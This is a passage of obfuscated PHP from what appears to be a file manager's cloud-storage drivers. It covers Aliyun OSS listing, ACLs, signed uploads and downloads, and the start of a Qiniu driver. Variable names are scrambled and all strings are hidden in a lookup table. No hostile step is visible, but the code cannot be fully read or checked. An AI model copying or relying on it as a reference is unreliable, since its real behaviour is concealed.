$this->pathThis($ıÂ¡ğ€Ş), $áÕºìé‹[87] => $this->getPathOuter($áÕºìé‹[8] . $ıÂ¡ğ€Ş), $áÕºìé‹[33] => $áÕºìé‹[78]); if ($¢ïÄÖäŸ) { return $˜Õ¸ğ‹; } $˜Õ¸ğ‹[$áÕºìé‹[234]] = $˜Õ¸ğ‹[$áÕºìé‹[88]] = 0; $˜Õ¸ğ‹[$áÕºìé‹[235]] = $˜Õ¸ğ‹[$áÕºìé‹[236]] = !0; if (empty($‹åõƒûÑ)) { $ıÂ¡ğ€Ş = rtrim($ıÂ¡ğ€Ş, $áÕºìé‹[8]) . $áÕºìé‹[8]; $ƒŠºà‚– = $this->objectMeta($ıÂ¡ğ€Ş); if (!$ƒŠºà‚–) { return $˜Õ¸ğ‹; } $‹åõƒûÑ = array($áÕºìé‹[234] => $ƒŠºà‚–[$áÕºìé‹[579]][$áÕºìé‹[1504]], $áÕºìé‹[88] => strtotime($ƒŠºà‚–[$áÕºìé‹[1501]])); } if (isset($‹åõƒûÑ[$áÕºìé‹[88]])) { $˜Õ¸ğ‹[$áÕºìé‹[88]] = $‹åõƒûÑ[$áÕºìé‹[88]]; } if (isset($‹åõƒûÑ[$áÕºìé‹[234]])) { $˜Õ¸ğ‹[$áÕºìé‹[234]] = $‹åõƒûÑ[$áÕºìé‹[234]]; } return $˜Õ¸ğ‹; } public function listPath($Í·ìëåÜ, $©‡¿¤Ó = false) { $ÑÚ”Áş– =& $_SERVER[ıÚ˜š²İ]; $“öèÂÌş = $this->fileList($Í·ìëåÜ, $ÑÚ”Áş–[8], !0); foreach ($“öèÂÌş[$ÑÚ”Áş–[85]] as $¯œÆ°‰– => $ú÷é”Ö–) { $“öèÂÌş[$ÑÚ”Áş–[85]][$¯œÆ°‰–] = $this->folderInfo($ú÷é”Ö–, $©‡¿¤Ó, $ú÷é”Ö–); } foreach ($“öèÂÌş[$ÑÚ”Áş–[86]] as $¯œÆ°‰– => $ú÷é”Ö–) { $“öèÂÌş[$ÑÚ”Áş–[86]][$¯œÆ°‰–] = $this->fileInfo($ú÷é”Ö–[$ÑÚ”Áş–[32]], $©‡¿¤Ó, $ú÷é”Ö–); } return $“öèÂÌş; } protected function infoChildren($ÄÈªğ¨ë, &$®˜Ù¦è) { $¸êåñàÉ =& $_SERVER[ıÚ˜š²İ]; $»•ÆÁ¨ = $this->fileList($ÄÈªğ¨ë, $¸êåñàÉ[12], !0); $®˜Ù¦è[$¸êåñàÉ[81]] += count($»•ÆÁ¨[$¸êåñàÉ[85]]); $®˜Ù¦è[$¸êåñàÉ[80]] += count($»•ÆÁ¨[$¸êåñàÉ[86]]); foreach ($»•ÆÁ¨[$¸êåñàÉ[86]] as $ô²Âµá¤) { if (!$ô²Âµá¤ || !$ô²Âµá¤[$¸êåñàÉ[79]]) { continue; } $®˜Ù¦è[$¸êåñàÉ[79]] += $ô²Âµá¤[$¸êåñàÉ[79]]; } } public function has($ûß•¹ûÑ, $±õÉÛ’À = false, $æ³”¼û“ = true) { $ŸşæœÁ€ =& $_SERVER[ıÚ˜š²İ]; $ûß•¹ûÑ = trim($ûß•¹ûÑ, $ŸşæœÁ€[8]); $‚Àß÷ñ² = empty($ûß•¹ûÑ) && $ûß•¹ûÑ !== $ŸşæœÁ€[231] ? $ŸşæœÁ€[12] : $ûß•¹ûÑ . $ŸşæœÁ€[8]; $®Š¸÷ÀÖ = $ŸşæœÁ€[12]; $÷¡‡¿ºˆ = 500; $äàåĞ¡ˆ = $»‹å—áø = 0; while (!0) { check_abort(); $ÛÅî˜Úç = array($ŸşæœÁ€[1495] => $ŸşæœÁ€[8], $ŸşæœÁ€[1496] => $‚Àß÷ñ², $ŸşæœÁ€[1497] => $÷¡‡¿ºˆ, $ŸşæœÁ€[1498] => $®Š¸÷ÀÖ); try { $óïÉ”˜ = $this->client->listObjects($this->bucket, $ÛÅî˜Úç); } catch (OSS\Core\OssException $½ª³¢³½) { $this->writeLog(__FUNCTION__ . $ŸşæœÁ€[215] . $½ª³¢³½->getMessage()); break; } $®Š¸÷ÀÖ = $óïÉ”˜->getNextMarker(); $û©Ò­‹£ = $óïÉ”˜->getObjectList(); $‚ÎŸã Ú = $óïÉ”˜->getPrefixList(); if ($±õÉÛ’À) { if (count($û©Ò­‹£) > 1 || count($û©Ò­‹£) == 1 && $û©Ò­‹£[0]->getKey() != $‚Àß÷ñ²) { $äàåĞ¡ˆ += count($û©Ò­‹£) - 1; } if (!empty($‚ÎŸã Ú)) { $»‹å—áø += count($‚ÎŸã Ú); } if ($®Š¸÷ÀÖ === $ŸşæœÁ€[12]) { break; } continue; } if ($æ³”¼û“) { if (!empty($û©Ò­‹£)) { if (count($û©Ò­‹£) > 1 || $û©Ò­‹£[0]->getKey() != $‚Àß÷ñ²) { return !0; } } } else { if (!empty($‚ÎŸã Ú)) { return !0; } } if ($®Š¸÷ÀÖ === $ŸşæœÁ€[12]) { break; } } if ($±õÉÛ’À) { return array($ŸşæœÁ€[242] => $äàåĞ¡ˆ, $ŸşæœÁ€[243] => $»‹å—áø); } return !1; } public function listAll($®¤É¶¸ø) { $Ê‡Ò…› =& $_SERVER[ıÚ˜š²İ]; $Ò²Ìá = $this->fileList($®¤É¶¸ø, $Ê‡Ò…›[12], !0); $¤À²×¤÷ = array_to_keyvalue($Ò²Ìá[$Ê‡Ò…›[86]], $Ê‡Ò…›[32]); foreach ($Ò²Ìá[$Ê‡Ò…›[85]] as $Áø¾ß™™) { if (is_string($Áø¾ß™™)) { $¤À²×¤÷[$Áø¾ß™™] = array($Ê‡Ò…›[79] => 0); } } return $this->listAllFiles($®¤É¶¸ø, $¤À²×¤÷); } public function canRead($ÕĞÉ©Öª) { $¡¨ĞŸ’¯ =& $_SERVER[ıÚ˜š²İ]; $Í—©•àò = $this->pathAcl($ÕĞÉ©Öª); return $Í—©•àò == $¡¨ĞŸ’¯[1505] || $Í—©•àò == $¡¨ĞŸ’¯[626] ? !0 : !1; } public function canWrite($ú ıËÂÎ) { $½®³ëß = $this->pathAcl($ú ıËÂÎ); return $½®³ëß == $_SERVER[ıÚ˜š²İ][626] ? !0 : !1; } public function pathAcl($İëÄóß‚) { $øÚÆÅäƒ =& $_SERVER[ıÚ˜š²İ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $Ú·¤Æ¦ó = $this->client->getObjectAcl($this->bucket, $this->pathEncode($İëÄóß‚)); } catch (OSS\Core\OssException $şŠÄÎ­Å) { $this->writeLog(__FUNCTION__ . $øÚÆÅäƒ[215] . $şŠÄÎ­Å->getMessage()); return !1; } $ç¨ßÃ¸· = $Ú·¤Æ¦ó == $øÚÆÅäƒ[37] ? $this->bucketAcl : $Ú·¤Æ¦ó; if ($ç¨ßÃ¸· == $øÚÆÅäƒ[1506]) { return $øÚÆÅäƒ[1505]; } if ($ç¨ßÃ¸· == $øÚÆÅäƒ[1507]) { return $øÚÆÅäƒ[626]; } return $ç¨ßÃ¸·; } private function chmodPath($×…ŠûÎ—, $•ÌÃ—×Å = '') { $á™È¢¥« =& $_SERVER[ıÚ˜š²İ]; $’î†öÖ” = empty($•ÌÃ—×Å) ? $á™È¢¥«[1507] : $•ÌÃ—×Å; $·‡±¾ôô = array($á™È¢¥«[37], $á™È¢¥«[232], $á™È¢¥«[1506], $á™È¢¥«[1507]); if (!in_array($’î†öÖ”, $·‡±¾ôô)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($×…ŠûÎ—), $’î†öÖ”); } catch (OSS\Core\OssException $ø‡¦°¶) { $this->writeLog(__FUNCTION__ . $á™È¢¥«[215] . $ø‡¦°¶->getMessage()); return !1; } return !0; } public function getContent($“í ËŠå) { return $this->fileSubstr($“í ËŠå, -1); } public function setContent($˜ƒ°ê Ò, $»Â”‰Œ½ = '') { $±µ©Ğà =& $_SERVER[ıÚ˜š²İ]; try { $–Ïş—Š× = $this->trafficLimit($±µ©Ğà[1508]); $•Ë†ÎÅ = $this->client->putObject($this->bucket, $this->pathEncode($˜ƒ°ê Ò), $»Â”‰Œ½, $–Ïş—Š×); } catch (OSS\Core\OssException $®Ø÷‹šô) { $this->writeLog(__FUNCTION__ . $±µ©Ğà[215] . $®Ø÷‹šô->getMessage()); return !1; } $ö»ı¢Ú¼ = array($±µ©Ğà[1502] => trim($•Ë†ÎÅ[$±µ©Ğà[1499]], $±µ©Ğà[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($˜ƒ°ê Ò))); $this->updateObjMeta($˜ƒ°ê Ò, $ö»ı¢Ú¼); return isset($•Ë†ÎÅ[$±µ©Ğà[1509]][$±µ©Ğà[297]]) ? !0 : !1; } private function updateObjMeta($©Ìûª°Á, $×Ò´¢­à) { $©Ìûª°Á = $this->pathEncode($©Ìûª°Á); try { $¥¶•…Ë„ = array(OSS\OssClient::OSS_HEADERS => $×Ò´¢­à); $this->client->copyObject($this->bucket, $©Ìûª°Á, $this->bucket, $©Ìûª°Á, $¥¶•…Ë„); } catch (OSS\Core\OssException $îÔöèşç) { $this->writeLog(__FUNCTION__ . $_SERVER[ıÚ˜š²İ][215] . $îÔöèşç->getMessage()); return !1; } return !0; } public function upload($Æâ…ô‘µ, $ûÁ²˜Øó, $Õ§²½¦Ü = false, $·ƒã×À® = REPEAT_REPLACE) { $çöÊ× =& $_SERVER[ıÚ˜š²İ]; $÷‹ºúóˆ = trim($Æâ…ô‘µ, $çöÊ×[8]); $¼ˆÃš× = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($çöÊ×[1502] => @md5_file($ûÁ²˜Øó)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Æâ…ô‘µ))); $¼ˆÃš× = $this->trafficLimit($çöÊ×[1508], $¼ˆÃš×); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($÷‹ºúóˆ), $ûÁ²˜Øó, $¼ˆÃš×); } catch (OSS\Core\OssException $‘•Œ ¬ó) { $this->writeLog(__FUNCTION__ . $çöÊ×[215] . $‘•Œ ¬ó->getMessage()); return !1; } return $this->getPathOuter($Æâ…ô‘µ); } public function getHost() { $ ù ¾âš =& $_SERVER[ıÚ˜š²İ]; $‚ËñÃ…‰ = explode($ ù ¾âš[211], parent::getHost()); return $‚ËñÃ…‰[0] . $ ù ¾âš[211] . $this->bucket . $ ù ¾âš[10] . $‚ËñÃ…‰[1]; } public function uploadFormData($ßÎÌ¥¯Û, $ª§šÎ…ç = 3600) { $“É«‰î =& $_SERVER[ıÚ˜š²İ]; if (!($™¾ñ­õ = $this->getHost())) { return !1; } $¾´€È°Ë = $ª§šÎ…ç; $ø€Şê±º = date($“É«‰î[1510], time() + $¾´€È°Ë); $‚¼Ø§Œ† = new DateTime($ø€Şê±º); $ÃÚÈúÑ• = $‚¼Ø§Œ†->format(DateTime::ISO8601); $š½üÂÖƒ = strpos($ÃÚÈúÑ•, $“É«‰î[373]); $ÃÚÈúÑ• = substr($ÃÚÈúÑ•, 0, $š½üÂÖƒ) . $“É«‰î[1511]; $Ã¿Åşù™ = 1048576000 * 5; $ÑÈ°ã©Ò = $this->pathFather($ßÎÌ¥¯Û); $Šñçî¥Ê = array($“É«‰î[265] => $ÃÚÈúÑ•, $“É«‰î[268] => array(array($“É«‰î[1512], 0, $Ã¿Åşù™), array($“É«‰î[270], $“É«‰î[271], $ÑÈ°ã©Ò))); $îº¹ÓèÇ = base64_encode(json_encode($Šñçî¥Ê)); $½›¹ÂÎº = base64_encode(hash_hmac($“É«‰î[1433], $îº¹ÓèÇ, $this->secret, !0)); $§€¡¡ë“ = array($“É«‰î[1513] => $this->accessKey, $“É«‰î[280] => $îº¹ÓèÇ, $“É«‰î[273] => $“É«‰î[264], $“É«‰î[1514] => $½›¹ÂÎº, $“É«‰î[209] => $™¾ñ­õ); $§€¡¡ë“ = $this->trafficLimit($“É«‰î[1508], $§€¡¡ë“, !0); return $§€¡¡ë“; } public function uploadMultiData($üÊûÇÇ, $¿îô¢ƒ² = 3600) { $„Š°ªœñ =& $_SERVER[ıÚ˜š²İ]; if (!($şª²Å× = $this->getHost())) { return !1; } $ÍÛØ­ğº = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($üÊûÇÇ)); return array($„Š°ªœñ[284] => $ÍÛØ­ğº, $„Š°ªœñ[209] => $şª²Å× . $„Š°ªœñ[8] . $this->pathEncode($üÊûÇÇ), $„Š°ªœñ[285] => gmdate($„Š°ªœñ[1515]), $„Š°ªœñ[97] => $üÊûÇÇ); } public function uploadMultiAuth($Ø¡ÇÙˆ, $¶¸“ÌÙ = array()) { if (isset($¶¸“ÌÙ[$_SERVER[ıÚ˜š²İ][286]])) { return $this->uploadPartAuth($Ø¡ÇÙˆ, $¶¸“ÌÙ); } return $this->uploadListAuth($Ø¡ÇÙˆ, $¶¸“ÌÙ); } private function uploadPartAuth($»Î«ì¥ã, $İ½–üŒ = array()) { $©ç×ë½£ =& $_SERVER[ıÚ˜š²İ]; $ãÄ‡§ = $İ½–üŒ[$©ç×ë½£[97]]; $…ü²»ÔŸ = $this->_getUploadAuth($ãÄ‡§, $İ½–üŒ); $ˆ‘¥´ü— = array($©ç×ë½£[289] => $…ü²»ÔŸ[$©ç×ë½£[289]], $©ç×ë½£[285] => $…ü²»ÔŸ[$©ç×ë½£[285]]); if (isset($…ü²»ÔŸ[$©ç×ë½£[1516]])) { $ˆ‘¥´ü—[$©ç×ë½£[1516]] = $…ü²»ÔŸ[$©ç×ë½£[1516]]; } return $ˆ‘¥´ü—; } private function uploadListAuth($Ò›Æâœ, $Í¢ó¨Ù = array()) { $ãş”‹ˆÍ =& $_SERVER[ıÚ˜š²İ]; $´ÊÕåé¦ = $Í¢ó¨Ù[$ãş”‹ˆÍ[97]]; $ôÍÂÌ§« = $Í¢ó¨Ù[$ãş”‹ˆÍ[284]]; $¬²™ÁÈ = $this->client->listParts($this->bucket, $this->pathEncode($´ÊÕåé¦), $ôÍÂÌ§«); $ÆÇşÕš = $¬²™ÁÈ->getListPart(); $çóÍÊ = array(); foreach ($ÆÇşÕš as $š‰ÄãÌö) { $çóÍÊ[] = array($ãş”‹ˆÍ[300] => $š‰ÄãÌö->getPartNumber(), $ãş”‹ˆÍ[301] => trim($š‰ÄãÌö->getETag(), $ãş”‹ˆÍ[121])); } if (!$çóÍÊ) { return !1; } $»ƒ×âÃ± = $this->_getUploadAuth($´ÊÕåé¦, $Í¢ó¨Ù); return array($ãş”‹ˆÍ[289] => $»ƒ×âÃ±[$ãş”‹ˆÍ[289]], $ãş”‹ˆÍ[285] => $»ƒ×âÃ±[$ãş”‹ˆÍ[285]], $ãş”‹ˆÍ[292] => $çóÍÊ); } private function _getUploadAuth($‹æâ–¾ß, $ïúŞ€ü¢) { $Ùƒ¢©ñÍ =& $_SERVER[ıÚ˜š²İ]; $ãÇ³òÍ‹ = gmdate($Ùƒ¢©ñÍ[1515]); $Ï†ØúŒé = isset($ïúŞ€ü¢[$Ùƒ¢©ñÍ[286]]) ? $Ùƒ¢©ñÍ[256] : $Ùƒ¢©ñÍ[291]; $ÈÉûÇ” = array_intersect_key($ïúŞ€ü¢, array_flip(array($Ùƒ¢©ñÍ[286], $Ùƒ¢©ñÍ[284]))); ksort($ÈÉûÇ”); $×¡¢â×Ÿ = $ÈÉûÇ” ? $Ùƒ¢©ñÍ[76] . http_build_query($ÈÉûÇ”, null, $Ùƒ¢©ñÍ[287], PHP_QUERY_RFC3986) : $Ùƒ¢©ñÍ[12]; $ôÇ“Ô™ğ = array($Ï†ØúŒé, $Ùƒ¢©ñÍ[12], $Ùƒ¢©ñÍ[123], $ãÇ³òÍ‹, "\x78\55\157\163\x73\55\x64\x61\164\145\72{$ãÇ³òÍ‹}", $Ùƒ¢©ñÍ[8] . $this->bucket . $Ùƒ¢©ñÍ[8] . $‹æâ–¾ß . $×¡¢â×Ÿ); if (isset($ïúŞ€ü¢[$Ùƒ¢©ñÍ[286]])) { $„™ÒÂ€Ğ = $this->trafficLimit($Ùƒ¢©ñÍ[1508], array(), !0); if ($„™ÒÂ€Ğ) { $‹æâ–¾ß = $Ùƒ¢©ñÍ[1516]; array_splice($ôÇ“Ô™ğ, 5, 0, $‹æâ–¾ß . $Ùƒ¢©ñÍ[4] . $„™ÒÂ€Ğ[$‹æâ–¾ß]); } } $é™ãÑß = implode($Ùƒ¢©ñÍ[288], $ôÇ“Ô™ğ); $„îå£ª« = base64_encode(hash_hmac($Ùƒ¢©ñÍ[1433], $é™ãÑß, $this->secret, !0)); $®„ú¡Œ = $Ùƒ¢©ñÍ[1485] . $this->accessKey . $Ùƒ¢©ñÍ[4] . $„îå£ª«; $­µ…‹ˆ­ = array($Ùƒ¢©ñÍ[289] => $®„ú¡Œ, $Ùƒ¢©ñÍ[285] => $ãÇ³òÍ‹); if (!empty($„™ÒÂ€Ğ)) { $­µ…‹ˆ­ = array_merge($­µ…‹ˆ­, $„™ÒÂ€Ğ); } return $­µ…‹ˆ­; } public function download($ìÊÒ—À¨, $°‰ß¶‡š) { $İß ‡Ù· =& $_SERVER[ıÚ˜š²İ]; if ($this->isFolder($ìÊÒ—À¨)) { return !1; } try { $Ø“ÚÁ»Ù = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $°‰ß¶‡š); $Ø“ÚÁ»Ù = $this->trafficLimit($İß ‡Ù·[112], $Ø“ÚÁ»Ù); $this->client->getObject($this->bucket, $this->pathEncode($ìÊÒ—À¨), $Ø“ÚÁ»Ù); } catch (OSS\Core\OssException $ù¥Õü€) { $this->writeLog(__FUNCTION__ . $İß ‡Ù·[215] . $ù¥Õü€->getMessage()); return !1; } return $°‰ß¶‡š; } public function fileSubstr($»¼ÅåòŸ, $Ó†½şÌ = 0, $‡ãŸÊÏ = false) { if ($Ó†½şÌ === -1) { $œöò„²Î = array(); } else { if ($‡ãŸÊÏ === !1) { $ƒßŸƒ‡š = $this->size($»¼ÅåòŸ); } else { $ƒßŸƒ‡š = $Ó†½şÌ + $‡ãŸÊÏ - 1; } $œöò„²Î = array(OSS\OssClient::OSS_RANGE => "{$Ó†½şÌ}\55{$ƒßŸƒ‡š}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($»¼ÅåòŸ), $œöò„²Î); } catch (OSS\Core\OssException $íşúËóß) { $this->writeLog(__FUNCTION__ . $_SERVER[ıÚ˜š²İ][215] . $íşúËóß->getMessage()); think_exception($íşúËóß->getMessage()); return !1; } } private function trafficLimit($´¦«Á’İ, $£ÀùÎø = array(), $ÛšáÉÒ‡ = false) { $“¹½„–á =& $_SERVER[ıÚ˜š²İ]; if ($´¦«Á’İ == $“¹½„–á[1508] && $this->isUploadServer() || $´¦«Á’İ == $“¹½„–á[112] && $this->isFileOutServer()) { return $£ÀùÎø; } $ğùöÎöì = floatval($GLOBALS[$“¹½„–á[6]][$“¹½„–á[92]][$“¹½„–á[110]][$´¦«Á’İ]) * 1024 * 1024 * 8; if (!$ğùöÎöì) { return $£ÀùÎø; } $ğùöÎöì = $ğùöÎöì < 819200 ? 819200 : ($ğùöÎöì > 838860800 ? 838860800 : $ğùöÎöì); if ($ÛšáÉÒ‡) { $£ÀùÎø[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ğùöÎöì); } else { if (!isset($£ÀùÎø[OSS\OssClient::OSS_HEADERS])) { $£ÀùÎø[OSS\OssClient::OSS_HEADERS] = array(); } $£ÀùÎø[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ğùöÎöì); } return $£ÀùÎø; } public function link($Ö¥¹ŞÍ, $Öõ§µØÜ = array()) { $á¹Æ’Íğ =& $_SERVER[ıÚ˜š²İ]; if (!$this->exist($Ö¥¹ŞÍ) || $this->isFolder($Ö¥¹ŞÍ)) { return !1; } try { $Öõ§µØÜ = $this->trafficLimit($á¹Æ’Íğ[112], $Öõ§µØÜ, !0); $±¢ŒØÎ§ = $this->client->signUrl($this->bucket, $this->pathEncode($Ö¥¹ŞÍ), 3600 * 12, $á¹Æ’Íğ[1517], $Öõ§µØÜ); return $this->getCdnLink($±¢ŒØÎ§); } catch (OSS\Core\OssException $Â—Ù¤å×) { $this->writeLog(__FUNCTION__ . $á¹Æ’Íğ[215] . $Â—Ù¤å×->getMessage()); return !1; } } public function fileOut($ôíüóûÕ, $§¸ì—‡™ = false, $šÁíø½€ = false, $ãÓ¥…‡¢ = '') { $ß¿­À =& $_SERVER[ıÚ˜š²İ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ôíüóûÕ, $§¸ì—‡™, $šÁíø½€, $ãÓ¥…‡¢); } if (!$šÁíø½€) { $šÁíø½€ = $this->pathThis($ôíüóûÕ); } $šÁíø½€ = rawurlencode($šÁíø½€); $¦ºô£ÙÜ = get_file_mime(get_path_ext($šÁíø½€)); if ($¦ºô£ÙÜ == $ß¿­À[251]) { return parent::fileOut($ôíüóûÕ, $§¸ì—‡™, $šÁíø½€, $ãÓ¥…‡¢); } $§¸ì—‡™ = $§¸ì—‡™ ? $ß¿­À[1518] : $ß¿­À[1519]; $×Ğ¿Õ = array(OSS\OssClient::OSS_SUB_RESOURCE => $ß¿­À[1520] . rawurlencode("{$§¸ì—‡™}\x3b\146\x69\154\x65\x6e\141\x6d\145\x3d{$šÁíø½€}")); $“âæñÖ’ = $this->link($ôíüóûÕ, $×Ğ¿Õ); $this->fileOutLink($“âæñÖ’); } public function fileOutServer($º”ı„ÏÎ, $Êåˆğ¶¡ = false, $ì¶¹ó¤ = false, $ùÄ¯Ï¤µ = '') { parent::fileOut($º”ı„ÏÎ, $Êåˆğ¶¡, $ì¶¹ó¤, $ùÄ¯Ï¤µ); } public function fileOutImage($Éû Úæ€, $êáô÷€ = 250) { if ($this->size($Éû Úæ€) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Éû Úæ€, $êáô÷€); } $»· àç = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ıÚ˜š²İ][1482] . $êáô÷€); $á²áãÛ = $this->link($Éû Úæ€, $»· àç); $this->fileOutLink($á²áãÛ); } public function fileOutImageServer($Ôâ·“ùû, $Ãğ™óî = 250) { parent::fileOutImage($Ôâ·“ùû, $Ãğ™óî); } public function fileOutLink($ë»Û©¹) { $Ì°Îé³” =& $_SERVER[ıÚ˜š²İ]; if (!$this->isCdnHost() && substr($ë»Û©¹, 0, 7) == $Ì°Îé³”[219]) { $ë»Û©¹ = $Ì°Îé³”[220] . substr($ë»Û©¹, 7); } header($Ì°Îé³”[175] . $ë»Û©¹); die; } public function hashMd5($ê×âŒÌñ, $ÎùşÈ€¤ = '') { $ÛÒÆàŠÒ =& $_SERVER[ıÚ˜š²İ]; $ı€Çê = $this->_objectMeta($ê×âŒÌñ); if (!$ı€Çê) { return $ÛÒÆàŠÒ[12]; } if (!isset($ı€Çê[$ÛÒÆàŠÒ[1502]]) && !empty($ÎùşÈ€¤)) { $±Ñ¾Îé = $this->updateObjMeta($ê×âŒÌñ, array($ÛÒÆàŠÒ[1502] => $ÎùşÈ€¤)); $ı€Çê[$ÛÒÆàŠÒ[1502]] = $±Ñ¾Îé ? $ÎùşÈ€¤ : $ÛÒÆàŠÒ[12]; } return isset($ı€Çê[$ÛÒÆàŠÒ[1502]]) ? strtolower($ı€Çê[$ÛÒÆàŠÒ[1502]]) : $ÛÒÆàŠÒ[12]; } public function size($ùÊòìÑ¹) { $œóŠÈ©¬ = $this->objectMeta($ùÊòìÑ¹); return $œóŠÈ©¬ ? $œóŠÈ©¬[$_SERVER[ıÚ˜š²İ][79]] : 0; } public function info($–ÙÅûê) { if ($this->isFolder($–ÙÅûê)) { return $this->folderInfo($–ÙÅûê); } else { if ($this->isFile($–ÙÅûê)) { return $this->fileInfo($–ÙÅûê); } } return !1; } public function exist($à³âÆŒï) { return $this->isFile($à³âÆŒï) || $this->isFolder($à³âÆŒï); } public function isFile($ÀÂíúŒè) { return !$this->isFolder($ÀÂíúŒè) && $this->objectMeta($ÀÂíúŒè); } public function isFolder($²¥¼²’Ğ) { return $this->cacheMethod($_SERVER[ıÚ˜š²İ][180], $²¥¼²’Ğ); } protected function objectMeta($‰ïÛùÉö) { return $this->cacheMethod($_SERVER[ıÚ˜š²İ][182], $‰ïÛùÉö); } protected function _objectMeta($˜¸™¼Õ) { $¸òˆ­ö =& $_SERVER[ıÚ˜š²İ]; try { $¢¥î»›» = $this->client->getObjectMeta($this->bucket, $this->pathEncode($˜¸™¼Õ)); } catch (OSS\Core\OssException $›¥‹ÁÔ§) { $this->writeLog(__FUNCTION__ . $¸òˆ­ö[215] . $›¥‹ÁÔ§->getMessage()); $¢¥î»›» = !1; } if ($¢¥î»›») { $¢¥î»›»[$¸òˆ­ö[79]] = intval($¢¥î»›»[$¸òˆ­ö[1500]]); } return $¢¥î»›»; } protected function _isFolder($øµà±Óö) { $ö’¹×“Ä =& $_SERVER[ıÚ˜š²İ]; if ($øµà±Óö == $ö’¹×“Ä[12] || $øµà±Óö == $ö’¹×“Ä[8]) { return !0; } $ŒŞ±»­¾ = array($ö’¹×“Ä[1495] => $ö’¹×“Ä[8], $ö’¹×“Ä[1496] => rtrim($øµà±Óö, $ö’¹×“Ä[8]) . $ö’¹×“Ä[8], $ö’¹×“Ä[1497] => 1, $ö’¹×“Ä[1498] => $ö’¹×“Ä[12]); $öı‡ıšÉ = $this->client->listObjects($this->bucket, $ŒŞ±»­¾); if ($öı‡ıšÉ->getObjectList() || $öı‡ıšÉ->getPrefixList()) { return !0; } return !1; } public function writeLog($öôçÛ§© = '', $ß‡ğ»¢  = false) { $»å³®Şş =& $_SERVER[ıÚ˜š²İ]; $Ú³Ãù½ = in_array(ACTION, array($»å³®Şş[213], $»å³®Şş[214])); if (!$Ú³Ãù½ && !GLOBAL_DEBUG) { return; } $µ®åä´ö = 0; if (stripos($öôçÛ§©, $»å³®Şş[1521]) !== !1) { $µ®åä´ö = 1; $ÕçÒß•× = explode($»å³®Şş[1522], $öôçÛ§©); $öôçÛ§© = !empty($ÕçÒß•×[1]) ? $ÕçÒß•×[1] : $öôçÛ§©; } else { if (stripos($öôçÛ§©, $»å³®Şş[1523])) { $µ®åä´ö = 2; $ÕçÒß•× = explode($»å³®Şş[1523], $öôçÛ§©); $ÕçÒß•× = explode($»å³®Şş[4], $ÕçÒß•×[0]); $öôçÛ§© = !empty($ÕçÒß•×[1]) ? $ÕçÒß•×[1] : $öôçÛ§©; } } if ($Ú³Ãù½ && I18n::getType() == $»å³®Şş[1524]) { if ($µ®åä´ö == 1) { $öôçÛ§© = str_replace($»å³®Şş[1525], $»å³®Şş[1526], $öôçÛ§©); } else { if ($µ®åä´ö == 2) { $ÕçÒß•× = explode($»å³®Şş[215], $ÕçÒß•×[0]); $¸¸î¼¹ = isset($ÕçÒß•×[1]) ? $ÕçÒß•×[1] : $»å³®Şş[12]; $ˆ‡®ùÒ’ = array($»å³®Şş[1527] => $»å³®Şş[1528], $»å³®Şş[1529] => $»å³®Şş[1530], $»å³®Şş[1531] => $»å³®Şş[1532], $»å³®Şş[1533] => $»å³®Şş[1534], $»å³®Şş[1535] => $»å³®Şş[1536], $»å³®Şş[1537] => $»å³®Şş[1538], $»å³®Şş[1539] => $»å³®Şş[1540], $»å³®Şş[1541] => $»å³®Şş[1542], $»å³®Şş[1543] => $»å³®Şş[1544], $»å³®Şş[1545] => $»å³®Şş[1546]); if (isset($ˆ‡®ùÒ’[$¸¸î¼¹])) { $öôçÛ§© = $ˆ‡®ùÒ’[$¸¸î¼¹]; } } } if (stripos($öôçÛ§©, $»å³®Şş[1547])) { $öôçÛ§© = $»å³®Şş[1548]; } } if (!trim($öôçÛ§©)) { return; } parent::writeLog(trim($öôçÛ§©), $ß‡ğ»¢ ); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($ÛùÁ›ÅÈ) { parent::__construct(); require_once SDK_DIR . $_SERVER[ıÚ˜š²İ][1549]; $this->_init($ÛùÁ›ÅÈ); } public function _init($›Û­²¡ß) { $Ê¤³¹ÃÇ =& $_SERVER[ıÚ˜š²İ]; $this->config = $›Û­²¡ß; foreach ($›Û­²¡ß as $ùÒŠÈ£¡ => $¥“ĞÀºÔ) { if (isset($this->{$ùÒŠÈ£¡})) { $this->{$ùÒŠÈ£¡} = $¥“ĞÀºÔ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Ê¤³¹ÃÇ[1550] . LNG($Ê¤³¹ÃÇ[1486])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($’Ü¿£¸ø, $Ì¼Ì«´ = '', $ëÀ£òò• = REPEAT_RENAME) { if ($this->setContent($’Ü¿£¸ø, $Ì¼Ì«´)) { return $this->getPathOuter($’Ü¿£¸ø); } return !1; } public function mkdir($íš«õù», $Ôë¾Æöâ = REPEAT_SKIP) { $ÓŞ‚»öÏ =& $_SERVER[ıÚ˜š²İ]; $²Èİ¨êß = trim($íš«õù», $ÓŞ‚»öÏ[8]); if ($this->_isFolder($²Èİ¨êß)) { return $this->getPathOuter($²Èİ¨êß); } $íš«õù» = $²Èİ¨êß . 